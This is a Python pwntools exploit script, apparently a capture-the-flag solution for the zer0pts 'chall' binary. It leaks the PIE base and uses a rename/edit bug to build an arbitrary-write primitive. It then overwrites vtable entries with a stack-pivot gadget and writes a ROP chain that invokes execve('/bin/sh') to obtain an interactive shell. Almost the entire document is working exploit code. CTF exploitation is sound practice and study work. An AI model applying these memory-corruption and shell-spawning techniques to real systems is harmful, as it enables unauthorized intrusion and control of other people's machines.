from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'pwn1.ctf.zer0pts.com'
PORT = 9002

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	# debug(r, [0xa1171])
	#debug(r, [0xa1de6])
	#debug(r, [0xa0f63])
	debug(r, [0xd8547, 0xd4925])

def n(name, vertices):
	r.sendlineafter('> ', '1')
	r.sendlineafter(': ', name)
	r.sendlineafter(': ', str(len(vertices)))
	for v in vertices:
		r.sendlineafter('= ', '({}, {})'.format(v[0], v[1]))
def s(name):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ', name)

def rename(name, new_name, ow=False):
	r.sendlineafter('> ', '3')
	r.sendlineafter(': ', name)
	r.sendlineafter(': ', new_name)
	if ow != False:
		r.sendlineafter('N]: ', ow)
	elif name == new_name:
		r.sendlineafter('N]: ', 'y')

def e(name, idx, v):
	r.sendlineafter('> ', '4')
	r.sendlineafter(': ', name)
	r.sendlineafter(': ', str(idx))
	r.sendlineafter('= ', '({}, {})'.format(v[0], v[1]))

def d(name):
	r.sendlineafter('> ', '5')
	r.sendlineafter(': ', name)

def leak_pie():
	r.sendlineafter('> ', '1')
	r.sendlineafter(': ', 'a')
	r.sendlineafter(': ', '1')
	r.recvuntil('_Dmain [')
	leak = int(r.recvuntil(']', True), 16)
	return leak

leak = leak_pie()
dbg('leak')
pie = leak - 0xa1d22
dbg('pie')
vtable = pie + 0x150960

pivot = pie + 0xe4b91

'''
 e4b91:       48 89 c4                mov    rsp,rax                                 
 e4b94:       48 01 c8                add    rax,rcx                                 
 e4b97:       48 89 e7                mov    rdi,rsp                                 
 e4b9a:       48 01 e6                add    rsi,rsp                                 
 e4b9d:       48 c1 e9 03             shr    rcx,0x3                                 
 e4ba1:       f3 48 a5                rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi] 
 e4ba4:       eb 02                   jmp    e4ba8 <__alloca+0x44>                   
 e4ba6:       31 c0                   xor    eax,eax                                 
 e4ba8:       c3                      ret                                            
 e4ba9:       00 00                   add    BYTE PTR [rax],al                       
'''

rsp = pie + 0x0010be8e
rdx = pie + 0x00107c56
rax = pie + 0x000c1cf2
rsi_p1 = pie + 0x0011f891
rdi = pie + 0x0011f893
syscall = pie + 0x00114c24



vs = [[1,1], [2,2], [3,3]]
n('a', vs)
rename('a', 'a', ow='!')

def aaw(where, what):
	v0 = what & 0xffffffff
	v1 = what >> 32
	if v0 >= 0x80000000:
		v0 -= 0x100000000
	if v1 >= 0x80000000:
		v1 -= 0x100000000
	
	e('a', str(where//8), [ v0, v1 ])

aaw(vtable+0x50, pivot)# 4->name->segv

offset = 0x98
aaw(vtable+0x00, rsp)
aaw(vtable+0x08, vtable+offset)

def build_rop(payload):
	for i in range(0, len(payload), 8):
		aaw(vtable+offset+i, u64(payload[i:i+8]))

payload = ''
payload += flat(rdx, 0, rax, 0x3b, rsi_p1, 0, 0, rdi, vtable+offset+0x50, syscall)
payload += "/bin/sh\x00"
build_rop(payload)

r.sendlineafter('> ', '4')
r.sendlineafter(': ', 'hello!')

r.interactive()
r.close()
